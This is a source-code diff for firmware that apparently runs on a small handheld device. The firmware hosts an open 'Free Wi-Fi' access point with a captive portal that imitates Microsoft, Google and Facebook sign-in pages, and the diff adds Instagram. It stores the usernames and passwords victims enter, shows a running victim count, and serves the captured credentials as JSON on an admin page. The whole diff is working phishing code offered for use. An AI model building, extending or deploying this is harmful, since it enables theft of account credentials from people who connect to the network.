@@ -20,7 +20,7 @@
 
 // Standard Wifi Name
 // Can be changed at http://127.0.0.1/ssid
-#define DEFAULT_AP_SSID_NAME "Free WiFi"
+#define DEFAULT_AP_SSID_NAME "Free Wi-Fi"
 
 // Secret to get the creds
 #define SECRET "P@ssw0rd!"
@@ -138,12 +138,14 @@ String hr,mi,se;
 byte use_google = 1;
 byte use_microsoft = 1;
 byte use_facebook = 1;
+byte use_instagram = 1;
 
-int cp1,cp2,cp3;
-String last_auth_prov[4]={"", "", "", ""};
-int last_auth_idx[4]={0, 0, 0, 0};
-String last_auth_username[4]={"", "", "", ""};
-String last_auth_pass[4]={"", "", "", ""};
+int cp1, cp2, cp3, cp4;
+String last_auth_prov[4] = {"", "", "", ""};
+int last_auth_idx[4] = {0, 0, 0, 0};
+String last_auth_username[4] = {"", "", "", ""};
+String last_auth_pass[4] = {"", "", "", ""};
+
 
 #define color 0x01EA
 #define color2 ORANGE
@@ -301,12 +303,17 @@ void setupWebServer() {
     webServer.send(HTTP_CODE, "text/html", provider_GET("facebook"));
   });
 
+  webServer.on("/instagram", []() {
+    webServer.send(HTTP_CODE, "text/html", provider_GET("instagram"));
+  });
+
   webServer.onNotFound([]() {
     lastActivity = millis();
     int pc = 0;
     if (use_google == 1) pc = pc + 1;
     if (use_microsoft == 1) pc = pc + 1;
     if (use_facebook == 1) pc = pc + 1;
+    if (use_instagram == 1) pc = pc + 1;
 
     if (pc >= 2){
       webServer.send(HTTP_CODE, "text/html", index_GET());
@@ -314,6 +321,8 @@ void setupWebServer() {
       webServer.send(HTTP_CODE, "text/html", provider_GET("facebook"));
     }else if (use_microsoft == 1){
       webServer.send(HTTP_CODE, "text/html", provider_GET("msft"));
+      }else if (use_instagram == 1){
+      webServer.send(HTTP_CODE, "text/html", provider_GET("insta"));
     }else{
       webServer.send(HTTP_CODE, "text/html", provider_GET("google"));
     }
@@ -419,7 +428,7 @@ void printScreen() {
   spr.setTextColor(WHITE,BLACK);
   spr.drawString("VICTIM",10,8,2);
   spr.setFreeFont(&DSEG7_Classic_Bold_32);
-  spr.drawString(String(cp1 + cp2 + cp3),10,30);
+  spr.drawString(String(cp1 + cp2 + cp3 +cp4),10,30);
 
   spr.setTextColor(WHITE,0x0083);
   spr.drawString("LAST AUTH",13,122,2);
@@ -460,24 +469,23 @@ void printScreen() {
   spr.setTextDatum(4);
   spr.setTextColor(WHITE,color);
   spr.drawString("MSFT",14,82,2);
-  if (use_google && use_facebook) {
-    spr.drawString("OTHER",74,82,2);
-  }else if (use_facebook) {
-    spr.drawString("FACE",74,82,2);
-  }else{
-    spr.drawString("GOOGLE",74,82,2);
-  }
-  spr.setFreeFont(&DSEG7_Classic_Bold_17);
-  if (use_microsoft) {
-    spr.drawString(String(cp1),17,102);
-  }else{
-    spr.drawString("na",17,102);
-  }
-  if (use_google || use_facebook) {
-    spr.drawString(String(cp2 + cp3),77,102);
-  }else{
-    spr.drawString("na",77,102);
-  }
+  if (use_google && use_facebook && use_instagram) {
+    spr.drawString("OTHER", 74, 82, 2);
+} else if (use_facebook && use_instagram) {
+    spr.drawString("FACE+INST", 74, 82, 2);
+} else if (use_google && use_instagram) {
+    spr.drawString("GOO+INST", 74, 82, 2);
+} else if (use_google && use_facebook) {
+    spr.drawString("GOO+FACE", 74, 82, 2);
+} else if (use_facebook) {
+    spr.drawString("FACE", 74, 82, 2);
+} else if (use_google) {
+    spr.drawString("GOOGLE", 74, 82, 2);
+} else if (use_instagram) {
+    spr.drawString("INST", 74, 82, 2);
+} else {
+    spr.drawString("na", 74, 82, 2);
+}
 
   spr.setTextDatum(0);
   spr.pushSprite(0,0); 
@@ -565,17 +573,22 @@ String index_GET() {
 
   String btn = "";
 
-  if (use_microsoft == 1){
-    btn = btn + "<button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/microsoft\"'>" + String(LOGO_MSFT) + "</button>";
-  }
+ if (use_microsoft == 1){
+    btn = btn + "<button type='button' style='background: transparent; float: left; margin-right: 5px;' class='containerlogo' onclick='javascript:location.href=\"/microsoft\"'>" + String(LOGO_MSFT) + "</button>";
+}
 
-  if (use_google == 1){
-    btn = btn + "<button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/google\"'>" + String(LOGO_GOOGLE) + "</button>";
-  }
+if (use_google == 1){
+    btn = btn + "<button type='button' style='background: transparent; float: left; margin-right: 5px;' class='containerlogo' onclick='javascript:location.href=\"/google\"'>" + String(LOGO_GOOGLE) + "</button>";
+}
 
-  if (use_facebook == 1){
-    btn = btn + "<button type='button' style='background: transparent' class='containerlogo' onclick='javascript:location.href=\"/facebook\"'>" + String(LOGO_FACEBOOK) + "</button>";
-  }
+if (use_facebook == 1){
+    btn = btn + "<button type='button' style='background: transparent; float: left; margin-right: 5px;' class='containerlogo' onclick='javascript:location.href=\"/facebook\"'>" + String(LOGO_FACEBOOK) + "</button>";
+}
+
+if (use_instagram == 1){
+    btn = btn + "<button type='button' style='background: transparent; float: left; margin-right: 5px;' class='containerlogo' onclick='javascript:location.href=\"/instagram\"'>" + String(LOGO_INSTAGRAM) + "</button>";
+}
+
 
   String html =
     "<!DOCTYPE html>"
@@ -613,6 +626,8 @@ String provider_GET(String provider) {
     provider = "Microsoft";
   }else if (provider == "facebook"){
     provider = "Facebook";
+    }else if (provider == "instagram"){
+    provider = "Instagram";
   }else{
     provider = "Google";
   }
@@ -641,22 +656,26 @@ String index_POST() {
   provider.toLowerCase();
 
   String ts = String(round(millis() / 1000));
-  String cred = "{\"timestamp\": "+ ts + ", \"provider\": \""+ provider +"\", \"username\": \""+ email +"\", \"password\": \""+ password +"\"}";
+  String cred = "{\n  \"timestamp\": " + ts + ",\n  \"provider\": \"" + provider + "\",\n  \"username\": \"" + email + "\",\n  \"password\": \"" + password + "\"\n}";
   if (capturedCredentialsJson != "") capturedCredentialsJson = capturedCredentialsJson + ",";
   capturedCredentialsJson = capturedCredentialsJson + cred;
 
   Serial.printf("%s\n", cred.c_str());
 
-  if ((provider == "microsoft") || (provider == "msft")){
+  if ((provider == "microsoft") || (provider == "msft")) {
     provider = "msft";
     cp1 = cp1 + 1;
-  }else if (provider == "facebook"){
+} else if (provider == "facebook") {
     provider = "face";
     cp3 = cp3 + 1;
-  }else{
+} else if (provider == "instagram") {
+    provider = "inst";
+    cp4 = cp4 + 1;
+} else {
     cp2 = cp2 + 1;
-  }
-  totalCapturedCredentials = cp1 + cp2 + cp3;
+}
+
+totalCapturedCredentials = cp1 + cp2 + cp3 + cp4;
 
   for(int i=3;i>=1;i--){
     if (last_auth_idx[i-1] > 0){
@@ -680,6 +699,8 @@ String index_POST() {
     provider = "Microsoft";
   }else if ((provider == "facebook") || (provider == "face")){
     provider = "Facebook";
+  }else if ((provider == "instagram") || (provider == "insta")){
+    provider = "Instagram";
   }else{
     provider = "Google";
   }
@@ -747,6 +768,8 @@ String getHtmlContents(String body, String provider) {
     logo = String(LOGO_MSFT);
   }else if (provider == "facebook"){
     logo = String(LOGO_FACEBOOK);
+     }else if (provider == "instagram"){
+    logo = String(LOGO_INSTAGRAM);
   }else{
     logo = String(LOGO_GOOGLE);
   }
@@ -808,7 +831,7 @@ String creds_GET() {
 }
 
 String config_GET() {
-  return getAdminHtmlContents("<center><div class='containertitle'>Config</div><div class='containersubtitle'>Adjust your configuration</div></center><form action='/post_config' method='POST' id='login-form'><input name='secret' class='input-field' type='password' placeholder='Admin Password' required><input name='ssid' class='input-field' type='text' placeholder='Wifi SSID' value='"+ apSsidName +"' required><div class='containermsg'>Selected enabled providers</div><input name='msft' class='input-field' type='checkbox' value='on' checked />Micosoft<br /><input name='google' class='input-field' type='checkbox' value='on' checked />Google<br /><input name='facebook' class='input-field' type='checkbox' value='on' checked />Facebook<div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Save</button></div></form>");
+return getAdminHtmlContents("<center><div class='containertitle'>Config</div><div class='containersubtitle'>Adjust your configuration</div></center><form action='/post_config' method='POST' id='login-form'><input name='secret' class='input-field' type='password' placeholder='Admin Password' required><input name='ssid' class='input-field' type='text' placeholder='Wifi SSID' value='"+ apSsidName +"' required><div class='containermsg'>Selected enabled providers</div><input name='msft' class='input-field' type='checkbox' value='on' checked />Microsoft<br /><input name='google' class='input-field' type='checkbox' value='on' checked />Google<br /><input name='facebook' class='input-field' type='checkbox' value='on' checked />Facebook<br /><input name='instagram' class='input-field' type='checkbox' value='on' checked />Instagram<br /><div class='containerbtn'><button id=submitbtn class=submit-btn type=submit>Save</button></div></form>");
 }
 
 String config_POST() {
@@ -820,6 +843,7 @@ String config_POST() {
   String msft = getInputValue("msft");
   String google = getInputValue("google");
   String facebook = getInputValue("facebook");
+  String instagram = getInputValue("instagram");
 
   String oldSSid = apSsidName;
   if (!ssid.isEmpty()) apSsidName = ssid;
@@ -827,11 +851,15 @@ String config_POST() {
   use_microsoft = 0;
   use_google = 0;
   use_facebook = 0;
+  use_instagram = 0;
   if (!msft.isEmpty() && msft == "on") use_microsoft = 1;
   if (!google.isEmpty() && google == "on") use_google = 1;
   if (!facebook.isEmpty() && facebook == "on") use_facebook = 1;
+  if (!instagram.isEmpty() && instagram == "on") use_instagram = 1;
 
-  if ((use_microsoft == 0) && (use_google == 0) && (use_facebook == 0)) use_google = 1;
+  if ((use_microsoft == 0) && (use_google == 0) && (use_facebook == 0) && (use_instagram == 0)) {
+    use_google = 1; 
+}
 
   if (oldSSid != apSsidName) setupWiFi();
 
